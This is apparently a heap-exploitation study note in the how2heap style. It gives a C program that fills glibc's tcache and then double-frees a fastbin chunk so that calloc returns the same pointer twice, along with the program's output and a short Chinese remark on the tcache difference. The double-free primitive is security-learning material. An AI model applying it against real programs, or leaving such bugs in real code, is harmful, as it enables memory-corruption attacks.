# fastbin_dup

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple double-free attack with fastbins.\n");

	printf("Fill up tcache first.\n");
	void *ptrs[8];
	for (int i=0; i<8; i++) {
		ptrs[i] = malloc(8);
	}
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("Allocating 3 buffers.\n");
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	printf("Freeing the first one...\n");
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);
	printf("1st calloc(1, 8): %p\n", a);
	printf("2nd calloc(1, 8): %p\n", b);
	printf("3rd calloc(1, 8): %p\n", c);

	assert(a == c);
}
```

**result**

```c
This file demonstrates a simple double-free attack with fastbins.
Fill up tcache first.
Allocating 3 buffers.
1st calloc(1, 8): 0x5627ff40c360
2nd calloc(1, 8): 0x5627ff40c380
3rd calloc(1, 8): 0x5627ff40c3a0
Freeing the first one...
If we free 0x5627ff40c360 again, things will crash because 0x5627ff40c360 is at the top of the free list.
So, instead, we'll free 0x5627ff40c380.
Now, we can free 0x5627ff40c360 again, since it's not the head of the free list.
Now the free list has [ 0x5627ff40c360, 0x5627ff40c380, 0x5627ff40c360 ]. If we malloc 3 times, we'll get 0x5627ff40c360 twice!
1st calloc(1, 8): 0x5627ff40c360
2nd calloc(1, 8): 0x5627ff40c380
3rd calloc(1, 8): 0x5627ff40c360
```

**analysis**

与旧版本glibc时唯一的区别就是，需要先将tcache填满，之后free的chunk才能进入，bins中。